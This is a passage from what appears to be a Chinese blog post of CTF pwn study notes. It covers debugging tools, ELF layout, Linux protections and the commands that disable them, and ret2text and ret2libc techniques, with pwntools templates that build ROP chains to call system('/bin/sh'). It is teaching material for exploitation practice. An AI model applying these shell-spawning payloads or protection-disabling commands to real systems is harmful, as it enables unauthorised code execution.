world!"</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> res<span class="token punctuation">;</span>        res <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>        c <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Result is: %d"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><p>在终端直接与远程程序交互：<code>nc ip port</code></p><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>参考文章：<a href="https://www.cnblogs.com/ve1kcon/p/17812418.html">https://www.cnblogs.com/ve1kcon/p/17812418.html</a></p><table><thead><tr><th>快捷键</th><th>作用</th></tr></thead><tbody><tr><td>n</td><td>重命名变量&#x2F;函数</td></tr><tr><td>y</td><td>修改函数原型或者变量类型</td></tr><tr><td>tab</td><td>在反汇编窗口中，进行<strong>汇编指令</strong>与<strong>伪代码</strong>之间的切换</td></tr><tr><td>esc</td><td>翻页，返回前一页面</td></tr><tr><td>space</td><td>在反汇编窗口中，进行<strong>列表视图</strong>与<strong>图形视图</strong>之间的切换</td></tr><tr><td>f12</td><td>打开字符串窗口，可用于字符串搜索</td></tr><tr><td>&#x2F;</td><td>添加注释</td></tr></tbody></table><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>参考文章：<a href="https://www.cnblogs.com/ve1kcon/p/17812420.html">https://www.cnblogs.com/ve1kcon/p/17812420.html</a></p><table><thead><tr><th>指令</th><th>作用</th></tr></thead><tbody><tr><td>gdb filename</td><td>进入调试可执行程序</td></tr><tr><td>r</td><td>开始&#x2F;重新运行程序</td></tr><tr><td>c</td><td>运行到断点&#x2F;结束</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>n</td><td>单步调试</td></tr><tr><td>s</td><td>单步调试并跟进函数</td></tr><tr><td>p&#x2F;x</td><td>用于计算（相当于计算器）</td></tr><tr><td>vmmap</td><td>获取调试进程中的虚拟映射地址范围</td></tr><tr><td>x&#x2F;gx    x&#x2F;gi    x&#x2F;gs</td><td>以数据 &#x2F; 汇编 &#x2F; 字符串的形式查看内存（x&#x2F;20gx一次查看更多数据）</td></tr><tr><td>b *address &#x2F; function_name &#x2F; *$rebase(address)</td><td>绝对地址 &#x2F; 函数名 &#x2F; 相对地址下断点</td></tr><tr><td>fin</td><td>跳出当前函数，执行到函数返回处</td></tr><tr><td>context</td><td>重新打印页面信息</td></tr><tr><td>code</td><td>查看程序基址</td></tr><tr><td>libc</td><td>查看libc基址</td></tr></tbody></table><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><code>checksec filename</code>查看架构、端序、保护</p><h4 id="elf文件格式"><a href="#elf文件格式" class="headerlink" title="elf文件格式"></a>elf文件格式</h4><ul><li><p><code>.init、.fini</code>：保存了进程初始化和结束所用的代码，这两个节通常都是由编译器自动添加</p></li><li><p><code>plt、got</code>：动态链接的跳转和全局入口表</p></li><li><p><code>.text</code>：代码段</p></li><li><p><code>.rodata</code>：保存了只读数据，可以读取但不能修改</p><p>例如示例代码中的<code>&quot;Result is: %d&quot;</code></p></li><li><p><code>.data</code>：已初始化的全局变量和局部静态变量都保存在<code>.data</code>段</p><p>例如示例代码中的<code>&quot;Hello world!&quot;</code></p></li><li><p><code>.bss</code>：未初始化的全局变量和局部静态变量默认值都为<code>0</code></p><p><code>.bss</code>段只是为未初始化的全局变量和局部静态变量预留位置没有内容，所以它在文件中也不占据空间</p><p>例如示例代码中的<code>buf</code></p></li></ul><h4 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h4><h5 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h5><p>指数据<strong>暂时存储</strong>的地方，所以才有<u>入栈、出栈</u>的说法，入栈和出栈都在栈顶（即将数据存放到数据暂存区的顶部以及从顶部取出数据），局部非静态变量存储在栈中</p><h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p><u>一个地址占<code>8</code>字节，可以使用<code>pwntools</code>的<code>p64</code>生成一个<code>64</code>位的地址</u></p><p><strong>栈</strong>：<code>rbp</code> -&gt; 栈底<code>rsp</code> -&gt; 栈顶</p><p><strong>当前执行指令寄存器</strong>：<code>rip</code></p><p><strong>传参</strong>：<code>rdi</code> -&gt; 一参<code>rsi</code> -&gt; 二参<code>rdx</code> -&gt; 三参</p><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6><p><u>一个地址占<code>4</code>字节，可以使用<code>pwntools</code>的<code>p32</code>生成一个<code>32</code>位的地址</u></p><p><strong>栈</strong>：<code>ebp</code>：栈底<code>esp</code>：栈顶</p><p><strong>当前执行指令寄存器</strong>：<code>eip</code></p><p><strong>传参</strong>：通过栈传参</p><h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5><p>详细过程讲解见视频</p><img src="/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/1.png" class><h4 id="linux保护机制"><a href="#linux保护机制" class="headerlink" title="linux保护机制"></a>linux保护机制</h4><ul><li><p><code>ASLR：Address Space Layout Randomization</code></p><p><code>linux</code>地址随机化，程序运行时的堆栈以及共享库的加载地址随机化</p><p>关闭<code>ASLR</code>:<code>sudo sysctl -w kernel.randomize_va_space=0</code></p></li><li><p><code>RELRO：RELocation Read-Only</code></p><ol><li><p><code>Full RELRO</code>：<code>got</code>表不可写</p></li><li><p><code>Partial RELRO</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭relro参数：-z norelro完全关闭-z lazy部分开启-z now完全开启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p><code>stack</code></p><p><code>canary</code>，防止栈溢出，位于<code>rbp - 0x8</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭canary参数：-fno-stack-protector<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>NX：Non-eXecute</code></p><ol><li><p><code>NX enable</code>：堆栈不可执行，仅<code>.text</code>段可执行</p></li><li><p><code>No NX</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭NX参数：-z execstack允许在堆栈上执行代码-z noexecstack禁止在堆栈上执行代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p><code>PIE</code></p><p>gcc编译，code，获取地址，下断点</p><ol><li><p><code>PIE enabled</code>：程序地址随机化</p></li><li><p><code>No PIE</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭PIE参数：-no-pie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol></li></ul><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>即返回到<code>text</code>段，劫持返回地址到后门（即覆盖<code>ret</code>为后门的地址）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>输入长度没有被限制导致覆盖到<code>ret</code></p><p>例如：<code>gets</code>函数不限制输入长度</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ul><li>检查保护（确认<code>no pie</code>以及<code>no canary</code>）</li><li>确定后门地址、变量到栈底的距离（根据<code>IDA</code>中变量后的<code>rbp-xx</code>得到与栈底的距离为<code>xx</code>）</li><li>填充中间空间（变量到栈底的距离+<code>rbp</code>的长度）并覆盖<code>ret</code>为返回地址</li></ul><h4 id="交互脚本模板"><a href="#交互脚本模板" class="headerlink" title="交互脚本模板"></a>交互脚本模板</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./filename'</span><span class="token comment">#修改成可执行文件名</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#打远程时改成1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token comment">#打远程时修改ip和端口</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment">#在需要调试的地方加上dbg()</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ret2libc"><a href="#3-ret2libc" class="headerlink" title="3.ret2libc"></a>3.ret2libc</h2><h3 id="前置基础-1"><a href="#前置基础-1" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p><code>gadget</code>：程序本身或者<code>libc</code>中存在的一些汇编指令，每一条指令有其对应的地址，将这些<code>gadget</code>地址部署到栈中可以执行该地址中存放的汇编指令</p><p>​例如：<code>ret2text</code>就是执行程序本身有的<code>system(&quot;/bin/sh&quot;);</code>指令</p><p><code>ROP</code>：一种利用现有程序中的代码片段（即<code>gadget</code>）来构造攻击的技术，通过构造一系列的<code>gadget</code>来实现攻击目标，也可以控制程序执行好几段不相邻的程序已有的代码</p><p>​例如：在返回地址处按顺序填上函数<code>func1</code>、<code>func2</code>、<code>func3</code>的地址就会依次执行这三个函数，更多的是利用其中的汇编指令</p><h4 id="工具指令"><a href="#工具指令" class="headerlink" title="工具指令"></a>工具指令</h4><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>获取<code>gadget</code>地址，<code>--binary</code>参数指定文件，可以是可执行文件或<code>libc</code>文件，<code>grep</code>用于筛选，<code>--string</code>用于筛选字符串</p><p>通过<code>pop rdi</code>可以将栈地址中的值传递给<code>rdi</code>寄存器，其他寄存器也同理，所以在构造<code>ROP</code>链时直接使用<code>p64(pop_rdi_ret) + p64(rdi_content)</code>即可控制<code>rdi</code>寄存器的值为<code>rdi_content</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span><span class="token comment">#控制寄存器的值</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--string</span> <span class="token string">'/bin/sh'</span><span class="token comment">#查找字符串</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./libc-2.35.so <span class="token parameter variable">--only</span> <span class="token string">'leave|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'leave'</span><span class="token comment">#查找leave ret指令地址</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--ropchain</span><span class="token comment">#生成现成的rop利用链直接getshell，适用于静态编译的程序</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span class="token comment">#查找ret指令的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="string"><a href="#string" class="headerlink" title="string"></a>string</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$strings</span> ./libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> GNU<span class="token comment">#获取libc版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h5><p>进入<code>glibc-all-in-one</code>文件夹下执行<code>./update_list</code>之后<code>cat list</code>确认是否有对应版本的<code>libc</code>，存在对应版本使用<code>./download libc版本名</code>进行下载，下载完成之后存在于<code>libs</code>文件夹下，需要用的时候将文件夹下的<code>libc</code>文件夹复制过去，下载失败可以直接复制下载地址到<code>windows</code>中下载再放到虚拟机里</p><p><strong>示例</strong></p><p>使用<code>strings</code>指令确定<code>libc</code>版本为<code>2.38-1ubuntu6</code>，使用<code>file</code>指令确定<code>32</code>位（也可以<code>checksec ./pwn</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$strings</span> ./libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> GNU GNU C Library <span class="token punctuation">(</span>Ubuntu GLIBC <span class="token number">2.38</span>-1ubuntu6<span class="token punctuation">)</span> stable release version <span class="token number">2.38</span>.Compiled by GNU CC version <span class="token number">13.2</span>.0.<span class="token variable">$file</span> libc.so.6 libc.so.6: ELF <span class="token number">32</span>-bit LSB shared object, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>495fc00b597566b5e14e221f563afe29ec1d8478, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认<code>list</code>列表中存在该版本的<code>libc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$cat</span> list    <span class="token number">2.23</span>-0ubuntu11.3_amd64<span class="token number">2.23</span>-0ubuntu11.3_i386<span class="token number">2.23</span>-0ubuntu3_amd64<span class="token number">2.23</span>-0ubuntu3_i386<span class="token number">2.27</span>-3ubuntu1.5_amd64<span class="token number">2.27</span>-3ubuntu1.5_i386<span class="token number">2.27</span>-3ubuntu1.6_amd64<span class="token number">2.27</span>-3ubuntu1.6_i386<span class="token number">2.27</span>-3ubuntu1_amd64<span class="token number">2.27</span>-3ubuntu1_i386<span class="token number">2.31</span>-0ubuntu9.12_amd64<span class="token number">2.31</span>-0ubuntu9.12_i386<span class="token number">2.31</span>-0ubuntu9.7_amd64<span class="token number">2.31</span>-0ubuntu9.7_i386<span class="token number">2.31</span>-0ubuntu9_amd64<span class="token number">2.31</span>-0ubuntu9_i386<span class="token number">2.35</span>-0ubuntu3.4_amd64<span class="token number">2.35</span>-0ubuntu3.4_i386<span class="token number">2.35</span>-0ubuntu3_amd64<span class="token number">2.35</span>-0ubuntu3_i386<span class="token number">2.37</span>-0ubuntu2.1_amd64<span class="token number">2.37</span>-0ubuntu2.1_i386<span class="token number">2.37</span>-0ubuntu2_amd64<span class="token number">2.37</span>-0ubuntu2_i386<span class="token number">2.38</span>-1ubuntu6_amd64<span class="token number">2.38</span>-1ubuntu6_i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载该版本的<code>libc</code>，如果下载失败可以直接复制里面的链接<code>https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb</code>在<code>windows</code>里下载再存到虚拟机里，下载完成后位于<code>libs</code>文件夹中，需要使用时直接<code>cp -r ~/glibc-all-in-one/libs/2.38-1ubuntu6_i386 ./2.38</code>复制文件夹使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$./download <span class="token number">2.38</span>-1ubuntu6_i386                   Getting <span class="token number">2.38</span>-1ubuntu6_i386  -<span class="token operator">></span> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb  -<span class="token operator">></span> Downloading libc binary package  -<span class="token operator">></span> Extracting libc binary packagex - debian-binaryx - control.tar.zstx - data.tar.zst/home/starrysky/glibc-all-in-one  -<span class="token operator">></span> Package saved to libs/2.38-1ubuntu6_i386  -<span class="token operator">></span> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.38-1ubuntu6_i386.deb  -<span class="token operator">></span> Downloading libc debug package  -<span class="token operator">></span> Extracting libc debug packagex - debian-binaryx - control.tar.zstx - data.tar.zst/home/starrysky/glibc-all-in-one  -<span class="token operator">></span> Package saved to libs/2.38-1ubuntu6_i386/.debug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h5><p>获取可执行文件的动态链接文件，包括<code>ld</code>和<code>libc</code>等</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ldd</span> ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h5><p>更改可执行文件的动态链接文件，更改<code>ld</code>可以直接指定<code>ld</code>文件，而更改<code>libc</code>需要先使用<code>ldd</code>查看原<code>libc</code>作为<code>--replace-needed</code>选项的第一个参数，一般默认是<code>libc.so.6</code></p><p><strong>libc和ld要同时更改确保在同一版本</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$patchelf</span> --replace-needed libc.so.6 ./2.38/libc.so.6 ./pwn<span class="token comment">#更改libc</span><span class="token variable">$patchelf</span> --set-interpreter ./2.35/ld-linux-x86-64.so.2 ./pwn<span class="token comment">#更改ld</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h5><p>能直接<code>getshell</code>的<code>gadget</code>，<u>添加参数<code>-l2</code>可以获得更多</u></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$one_gadget</span> ./libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h4><p>参考文章：<a href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</a></p><p>延迟绑定是一种在程序运行时才解析<strong>外部符号</strong>（如函数和变量）地址的技术，它允许程序在启动时不必立即加载所有动态链接库中的符号，从而提高程序的启动速度</p><p><code>c</code>语言内置的函数(例如<code>printf</code>）都是依赖于<code>libc</code>中的外部函数</p><h5 id="动态链接与静态链接"><a href="#动态链接与静态链接" class="headerlink" title="动态链接与静态链接"></a>动态链接与静态链接</h5><p><strong>动态链接</strong>是指在程序运行时才将程序与所需的动态链接库中的库函数链接起来的过程，动态链接的程序在启动时会加载所需的动态库（例如<code>libc</code>），并在运行时解析外部符号的地址</p><p><strong>静态链接</strong>在编译时将所有需要的库函数直接复制到可执行文件中，生成的可执行文件不依赖于外部的库文件，可以独立运行，但是会导致可执行文件体积增大</p><h5 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h5><p><strong>PLT（Procedure Linkage Table）</strong> 是一个代码段，包含了用于动态链接的跳转指令。每个需要动态链接的外部函数都会在<code>PLT</code>中有一个条目，当程序第一次调用这个函数时，<code>PLT</code>中的代码会被执行，这个代码会去查找并解析外部函数的实际地址，并将其存储在<code>GOT</code>中，以便后续调用时直接跳转到正确的地址</p><p><strong>GOT（Global Offset Table）</strong> 是一个数据段，存储了所有外部符号的地址。在程序启动时，<code>GOT</code>中的条目可能并不包含最终的地址，而是包含指向<code>PLT</code>中相应条目的指针。当<code>PLT</code>条目第一次被执行时，会将查找到的外部符号地址更新到<code>GOT</code>中，这样后续的调用就可以直接通过<code>GOT</code>找到正确的地址</p><h5 id="延迟绑定过程"><a href="#延迟绑定过程" class="headerlink" title="延迟绑定过程"></a>延迟绑定过程</h5><ol><li><strong>程序启动</strong>：程序启动时，动态链接器加载程序和所有依赖的动态库</li><li><strong>符号解析</strong>：当程序第一次调用一个外部函数时，<code>PLT</code>中的代码会被执行，查找并解析外部函数的实际地址</li><li><strong>地址存储</strong>：查找到的地址被存储在<code>GOT</code>中，以便后续调用</li><li><strong>直接调用</strong>：后续对同一外部函数的调用将直接通过<code>GOT</code>进行，无需再次解析</li></ol><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>执行函数的<code>plt</code>会通过跳转<code>got</code>直接调用到该函数</li><li><code>got</code>表可写的情况下覆盖函数的<code>got</code>表为其他函数地址可以实现调用该函数时执行到其他函数</li></ul><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>目标是执行<code>system(&quot;/bin/sh&quot;);</code>，即执行<code>system</code>函数其一参为<code>&quot;/bin/sh&quot;</code></p><h4 id="有system和-x2F-bin-x2F-sh"><a href="#有system和-x2F-bin-x2F-sh" class="headerlink" title="有system和&#x2F;bin&#x2F;sh"></a>有system和&#x2F;bin&#x2F;sh</h4><p>延迟绑定部分提到，执行函数的<code>plt</code>可以直接调用到该函数，那么构造<code>rop</code>链就是要先控制一参<code>rdi</code>为<code>&quot;/bin/sh&quot;</code>的地址再填<code>system</code>的<code>plt</code></p><ul><li><p>控制一参</p><p>使用<code>ROPgadget</code>找到<code>pop rdi</code>的地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ps：<code>gadget</code>中含有<code>pop rdi</code>就行，但是有<code>pop</code>其他寄存器就需要在后面加上对应的值，例如<code>0x000ac112 : pop rdi ; pop rbx ; ret</code>，<code>pop rdi</code>之后还<code>pop rbx</code>，所以后面需要加两个地址，即<code>p64(0x000ac112) + p64(rdi_content) + p64(rbx_content)</code>，后面就可以继续加其他<code>gadget</code></p></li><li><p>找<code>&quot;/bin/sh&quot;</code>地址</p><p><code>&quot;/bin/sh&quot;</code>地址需要在<code>IDA</code>中查找，直接按<code>f12</code>找到对应地址</p></li><li><p>找<code>system</code>函数地址</p><p><code>pwntools</code>中可以直接获取<code>plt</code>和<code>got</code>的地址：<code>elf.plt[&#39;system&#39;]</code><code>elf.got[&#39;system&#39;]</code></p></li></ul><p>最终构造出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> bin_sh <span class="token operator">=</span> IDA中<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh地址system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="有system无-x2F-bin-x2F-sh"><a href="#有system无-x2F-bin-x2F-sh" class="headerlink" title="有system无&#x2F;bin&#x2F;sh"></a>有system无&#x2F;bin&#x2F;sh</h4><p>缺少<code>/bin/sh</code>可以直接往程序中的一个地址写入<code>/bin/sh</code>，假设地址是<code>buf</code>，那么就要先构造<code>gets(buf)</code>，读取<code>/bin/sh</code>之后再执行<code>system(&#39;/bin/sh&#39;)</code>，其中<code>system</code>的一参就说<code>buf</code>，即<code>/bin/sh</code>的地址</p><ul><li>获取<code>gets</code>的<code>plt</code>地址：<code>elf.plt[&#39;gets&#39;]</code></li><li>设置<code>buf</code>的地址，从<code>IDA</code>中选取，可以从<code>bss</code>段中选取地址</li><li>获取<code>system</code>的<code>plt</code>地址：<code>elf.plt[&#39;system&#39;]</code></li><li>设置一参：<code>ROPgadget --binary ./pwn --only &#39;pop|ret&#39; | grep &#39;rdi&#39;</code></li></ul><p>最终构造：注意发送<code>/bin/sh</code>最后加上<code>\x00</code>截断字符串，在执行<code>rop</code>链的过程中会执行<code>gets(buf)</code>从输入流输入<code>buf</code>的值，此时输入<code>/bin/sh\x00</code>即可向<code>buf</code>输入字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> buf <span class="token operator">=</span> gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span><span class="token comment">#gets(buf)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token comment">#system(buf)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无system无-x2F-bin-x2F-sh"><a href="#无system无-x2F-bin-x2F-sh" class="headerlink" 